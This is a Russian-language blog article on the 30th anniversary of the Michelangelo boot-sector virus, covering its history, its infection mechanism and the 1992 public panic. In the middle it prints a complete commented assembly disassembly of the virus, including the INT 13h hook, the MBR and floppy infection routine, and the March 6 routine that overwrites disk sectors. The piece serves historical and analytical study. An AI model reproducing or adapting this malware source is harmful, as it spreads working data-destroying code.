[
   "Вирусу Микеланджело — 30 лет",
   "Michelangelo — первое вредоносное ПО, которое получило широкую огласку в новостных СМИ. Одним из первых его заметил владелец компьютерного магазина в австралийском Мельбурне. После установки нескольких программ на мониторе появилось  большое количество странных символов. Дальнейшее расследование показало, что он невольно загрузил вирус в систему. 6 марта 1992 года вирус активировался, перезаписав данные на жёстком диске компьютеров, которые были заражены.Исследователи выяснили, что Michelangelo заражал загрузочные сектора гибких дискет и жёстких дисков. Интересно, что весь год DOS-вирус вёл себя пассивно, вредя людям только 6 марта. Если компьютер в этот день был выключен, с ним ничего не происходило. Каждый год в этот день при загрузке инфицированной системы «Микеланджело» записывал произвольные данные в случайном порядке на диск и тем самым выводил компьютер из строя. Поскольку 6 марта — день рождения великого художника эпохи Возрождения Микеланджело, вирус был назван в его честь. Другие его названия: Stoned.March6.a и Stoned.MichelangeloНикто так и не узнал, кто написал вирус. Предполагается, что он появился где-то на Тайване, но убедительных доказательств этому так и не было. Выяснилось, что Michelangelo уничтожает загрузочные сектора дисков, что, в свою очередь, приводит к уничтожению данных на диске и жёстком диске компьютера.Принцип работы«Микеланджело» — вирус загрузочного сектора, разновидность вредоносного ПО, которое заражает загрузочный сектор жёсткого диска или, что более важно, основную загрузочную запись (MBR) жёсткого диска. Вирус был разработан для заражения DOS систем и работал на уровне BIOS. Заразив компьютер AT или PS/2, Michelangelo перезаписывал первые сто секторов жёсткого диска нулями.Микеланджело был основан на вирусе Stoned , который известен с 1987 года и также известен под названием Marijuana или New Zealand Virus. Код вируса был изменён, чтобы антивирусные программы не могли его распознавать.При работе с заражённым носителем данных Микеланджело резервирует два килобайта системной памяти по адресу 40h: 13h. Затем код вируса копируется в эту область. При наличии жёсткого диска вирус считывает MBR и проверяет, не заражён ли он. Затем, Микеланджело сравнивает первые 4 байта главного загрузочного сектора с первыми байтами своего собственного кода. Если они не совпадают, вирус пытается заразить устройство.На жёстких дисках вирус перемещает исходную главную загрузочную запись в цилиндр 0, головку 0, сектор 7.На гибких дисках, если диск равен 360 КБ, вирус перемещает исходный загрузочный сектор в цилиндр 0, головку 1, сектор 3.На других дисках вирус перемещает исходный загрузочный сектор в цилиндр 0, головку 1, сектор 14.Хотя вирус предназначен для заражения DOS-систем, он может легко разрушить другие операционные системы, поскольку заражает главную загрузочную запись жёсткого диска. Как только компьютер заражается  любая вставленная дискета, на которую выполняется запись (в 1992 году вирус не мог заразить дискету до тех пор, пока не будет дан доступ к диску), также немедленно заражается. А поскольку вирус проводит большую часть своего времени в спящем состоянии, активируясь только 6 марта, вполне возможно, что заражённый компьютер мог годами оставаться незамеченным — до тех пор, пока не будет включён шестого марта.Код Michelangelo; This is a disassembly of the much-hyped michelangelo virus.\n; As you can see, it is a derivative of the Stoned virus.  The\n; junk bytes at the end of the file are probably throwbacks to\n; the Stoned virus.  In any case, it is yet another boot sector\n; and partition table infector.\n\nmichelangelo    segment byte public\n\t\tassume  cs:michelangelo, ds:michelangelo\n; Disassembly by Dark Angel of PHALCON/SKISM\n\t\torg     0\n\n\t\tjmp     entervirus\nhighmemjmp      db      0F5h, 00h, 80h, 9Fh\nmaxhead         db      2                       ; used by damagestuff\nfirstsector     dw      3\noldint13h       dd      0C8000256h\n\nint13h:\n\t\tpush    ds\n\t\tpush    ax\n\t\tor      dl, dl                  ; default drive?\n\t\tjnz     exitint13h              ; exit if not\n\t\txor     ax, ax\n\t\tmov     ds, ax\n\t\ttest    byte ptr ds:[43fh], 1   ; disk 0 on?\n\t\tjnz     exitint13h              ; if not spinning, exit\n\t\tpop     ax\n\t\tpop     ds\n\t\tpushf\n\t\tcall    dword ptr cs:[oldint13h]; first call old int 13h\n\t\tpushf\n\t\tcall    infectdisk              ; then infect\n\t\tpopf\n\t\tretf    2\nexitint13h:     pop     ax\n\t\tpop     ds\n\t\tjmp     dword ptr cs:[oldint13h]\n\ninfectdisk:\n\t\tpush    ax\n\t\tpush    bx\n\t\tpush    cx\n\t\tpush    dx\n\t\tpush    ds\n\t\tpush    es\n\t\tpush    si\n\t\tpush    di\n\t\tpush    cs\n\t\tpop     ds\n\t\tpush    cs\n\t\tpop     es\n\t\tmov     si, 4\nreadbootblock:\n\t\tmov     ax,201h                 ; Read boot block to\n\t\tmov     bx,200h                 ; after virus\n\t\tmov     cx,1\n\t\txor     dx,dx\n\t\tpushf\n\t\tcall    oldint13h\n\t\tjnc     checkinfect             ; continue if no error\n\t\txor     ax,ax\n\t\tpushf\n\t\tcall    oldint13h               ; Reset disk\n\t\tdec     si                      ; loop back\n\t\tjnz     readbootblock\n\t\tjmp     short quitinfect        ; exit if too many failures\ncheckinfect:\n\t\txor     si,si\n\t\tcld\n\t\tlodsw\n\t\tcmp     ax,[bx]                 ; check if already infected\n\t\tjne     infectitnow\n\t\tlodsw\n\t\tcmp     ax,[bx+2]               ; check again\n\t\tje      quitinfect\ninfectitnow:\n\t\tmov     ax,301h                 ; Write old boot block\n\t\tmov     dh,1                    ; to head 1\n\t\tmov     cl,3                    ; sector 3\n\t\tcmp     byte ptr [bx+15h],0FDh  ; 360k disk?\n\t\tje      is360Kdisk\n\t\tmov     cl,0Eh\nis360Kdisk:\n\t\tmov     firstsector,cx\n\t\tpushf\n\t\tcall    oldint13h\n\t\tjc      quitinfect              ; exit on error\n\t\tmov     si,200h+offset partitioninfo\n\t\tmov     di,offset partitioninfo\n\t\tmov     cx,21h                  ; Copy partition table\n\t\tcld\n\t\trep     movsw\n\t\tmov     ax,301h                 ; Write virus to sector 1\n\t\txor     bx,bx\n\t\tmov     cx,1\n\t\txor     dx,dx\n\t\tpushf\n\t\tcall    oldint13h\nquitinfect:\n\t\tpop     di\n\t\tpop     si\n\t\tpop     es\n\t\tpop     ds\n\t\tpop     dx\n\t\tpop     cx\n\t\tpop     bx\n\t\tpop     ax\n\t\tretn\nentervirus:\n\t\txor     ax,ax\n\t\tmov     ds,ax\n\t\tcli\n\t\tmov     ss,ax\n\t\tmov     ax,7C00h                ; Set stack to just below\n\t\tmov     sp,ax                   ; virus load point\n\t\tsti\n\t\tpush    ds                      ; save 0:7C00h on stack for\n\t\tpush    ax                      ; later retf\n\t\tmov     ax,ds:[13h*4]\n\t\tmov     word ptr ds:[7C00h+offset oldint13h],ax\n\t\tmov     ax,ds:[13h*4+2]\n\t\tmov     word ptr ds:[7C00h+offset oldint13h+2],ax\n\t\tmov     ax,ds:[413h]            ; memory size in K\n\t\tdec     ax                      ; 1024 K\n\t\tdec     ax\n\t\tmov     ds:[413h],ax            ; move new value in\n\t\tmov     cl,6\n\t\tshl     ax,cl                   ; ax = paragraphs of memory\n\t\tmov     es,ax                   ; next line sets seg of jmp\n\t\tmov     word ptr ds:[7C00h+2+offset highmemjmp],ax\n\t\tmov     ax,offset int13h\n\t\tmov     ds:[13h*4],ax\n\t\tmov     ds:[13h*4+2],es\n\t\tmov     cx,offset partitioninfo\n\t\tmov     si,7C00h\n\t\txor     di,di\n\t\tcld\n\t\trep     movsb                   ; copy to high memory\n\t\t\t\t\t\t; and transfer control there\n\t\tjmp     dword ptr cs:[7C00h+offset highmemjmp]\n; destination of highmem jmp\n\t\txor     ax,ax\n\t\tmov     es,ax\n\t\tint     13h                     ; reset disk\n\t\tpush    cs\n\t\tpop     ds\n\t\tmov     ax,201h\n\t\tmov     bx,7C00h\n\t\tmov     cx,firstsector\n\t\tcmp     cx,7                    ; hard disk infection?\n\t\tjne     floppyboot              ; if not, do floppies\n\t\tmov     dx,80h                  ; Read old partition table of\n\t\tint     13h                     ; first hard disk to 0:7C00h\n\t\tjmp     short exitvirus\nfloppyboot:\n\t\tmov     cx,firstsector          ; read old boot block\n\t\tmov     dx,100h                 ; to 0:7C00h\n\t\tint     13h\n\t\tjc      exitvirus\n\t\tpush    cs\n\t\tpop     es\n\t\tmov     ax,201h                 ; read boot block\n\t\tmov     bx,200h                 ; of first hard disk\n\t\tmov     cx,1\n\t\tmov     dx,80h\n\t\tint     13h\n\t\tjc      exitvirus\n\t\txor     si,si\n\t\tcld\n\t\tlodsw\n\t\tcmp     ax,[bx]                 ; is it infected?\n\t\tjne     infectharddisk          ; if not, infect HD\n\t\tlodsw                           ; check infection\n\t\tcmp     ax,[bx+2]\n\t\tjne     infectharddisk\nexitvirus:\n\t\txor     cx,cx                   ; Real time clock get date\n\t\tmov     ah,4                    ; dx = mon/day\n\t\tint     1Ah\n\t\tcmp     dx,306h                 ; March 6th\n\t\tje      damagestuff\n\t\tretf                            ; return control to original\n\t\t\t\t\t\t; boot block @ 0:7C00h\ndamagestuff:\n\t\txor     dx,dx\n\t\tmov     cx,1\nsmashanothersector:\n\t\tmov     ax,309h\n\t\tmov     si,firstsector\n\t\tcmp     si,3\n\t\tje      smashit\n\t\tmov     al,0Eh\n\t\tcmp     si,0Eh\n\t\tje      smashit\n\t\tmov     dl,80h                  ; first hard disk\n\t\tmov     maxhead,4\n\t\tmov     al,11h\nsmashit:\n\t\tmov     bx,5000h                ; random memory area\n\t\tmov     es,bx                   ; at 5000h:5000h\n\t\tint     13h                     ; Write al sectors to drive dl\n\t\tjnc     skiponerror             ; skip on error\n\t\txor     ah,ah                   ; Reset disk drive dl\n\t\tint     13h\nskiponerror:\n\t\tinc     dh                      ; next head\n\t\tcmp     dh,maxhead              ; 2 if floppy, 4 if HD\n\t\tjb      smashanothersector\n\t\txor     dh,dh                   ; go to next head/cylinder\n\t\tinc     ch\n\t\tjmp     short smashanothersector\ninfectharddisk:\n\t\tmov     cx,7                    ; Write partition table to\n\t\tmov     firstsector,cx          ; sector 7\n\t\tmov     ax,301h\n\t\tmov     dx,80h\n\t\tint     13h\n\t\tjc      exitvirus\n\t\tmov     si,200h+offset partitioninfo ; Copy partition\n\t\tmov     di,offset partitioninfo      ; table information\n\t\tmov     cx,21h\n\t\trep     movsw\n\t\tmov     ax,301h                 ; Write to sector 8\n\t\txor     bx,bx                   ; Copy virus to sector 1\n\t\tinc     cl\n\t\tint     13h\n;*              jmp     short 01E0h\n\t\tdb      0EBh, 32h               ; ?This should crash?\n; The following bytes are meaningless.\ngarbage         db      1,4,11h,0,80h,0,5,5,32h,1,0,0,0,0,0,53h\npartitioninfo:  db      42h dup (0)\nmichelangelo    ends\n\t\tendИстерия в обществеПоскольку опасность была вовремя обнаружена, «Микеланджело» не вызвал заметных проблем в год своего открытия. Постепенно он распространился по всему миру. Исследования в Европе показали, что вирус в основном распространялся через диски с драйверами для компьютерной техники из Восточной Азии, и по мере приближения 6 марта 1992 года среди владельцев и пользователей компьютеров царила нарастающая истерия. Это была бомба замедленного действия, которую легко было описать в новостях. И эта история стала идеальным сюжетом для запугивания публики. Принял участие в запугивании публики и Джон Макафи, который заявил в интервью, что сотни тысяч компьютеров по всему миру станут 6 марта жертвами Michelangelo.Совет по борьбе со зловредом был весьма необычным: пользователям рекомендовали не включать компьютер 6 марта или перевести дату сразу на седьмое марта.Хотя компьютеры в те времена были далеко не у всех, существовал большой спрос на детекторы вирусов и антивирусное ПО. Компьютерные магазины предлагали эти программы бесплатно, как и некоторые вузы. Гамбургский университет насчитал более 20 000 запросов на такие программы за несколько недель до 6 марта 1992 года. Особенно активно следили за происходящим в Германии и США. Федеральное управление по информационной безопасности (BSI) в период с 17 февраля 1992 г. по 1 марта 1992 г. приняло около 1000 звонков по общим и конкретным вопросам, касающимся компьютерных вирусов и антивирусных программ. Было вынесено официальное предупреждение об угрозе. В феврале 1992 года появилась инструкция по защите от Микеланджело.До «дня X» Michelangelo поразил 1300 компьютеров в ФРГ, но эксперты считают, что реальное число в 10 раз больше. Никто не знает, сколько ПК пострадало во всем мире. 6 марта 1992 г. утренние новости в Германии сообщили о первых инцидентах с вирусом в Уругвае. Системное время на некоторых военных компьютерах было установлено неправильно, поэтому полезная нагрузка Микеланджело сработала преждевременно. Также известно, что вирус вызвал потерю данных примерно на 1500 компьютерах в Германии. Сообщается, что в Великобритании пострадали 117 ПК. В Соединённых Штатах, где истерия была самой большой, зафиксировано около 7000 жалоб. McAfee сообщила о почти 10 000. В Южной Африке обнаружили около 1000 заражённых компьютеров в аптеках, который получали прейскуранты в электронном виде. Оптовик как обычно отправил им дискеты, которые оказались заражены вирусом.В целом, панические настроения не оправдались, всё прошло относительно спокойно. Symantec AntiVirus Research Center утверждает, что после 6 марта 1992 года известно всего о двух случаях заражения компьютеров Michelangelo. По другим данным, в Германии зафиксировали 50 инцидентов с вирусом в 1993 году и менее 20 — в 1994 году.«Микеланджело» не был первым компьютерным вирусом. Но стал первым, кто заставил широкую общественность узнать о хаосе, который могут вызвать вредоносные программы. Это событие стало мощным толчком к зарождению полноценной антивирусной индустрии. Например, компания McAfee привлекла инвестиции в размере 42 млн долларов, а владельцы компьютеров по всему миру бросились скупать антивирусные продукты McAfee.P.S. Возможно, вы заметили, что в фильме \"Хакеры\" 1995 фигурирует вирус \"Да Винчи\" — название явно было отсылкой к Michelangelo.Что ещё интересного есть в блоге Cloud4Y→ История Game Genie — чит-устройства, которое всколыхнуло мир→ Сделайте Linux похожим на Windows 95→ Как не позволить техническому долгу одолеть вас→ WD-40: средство, которое может почти всё→ 30 лучших Python-проектов на GitHub на начало 2022 годаПодписывайтесь на наш Telegram-канал, чтобы не пропустить очередную статью. Пишем только по делу. "
]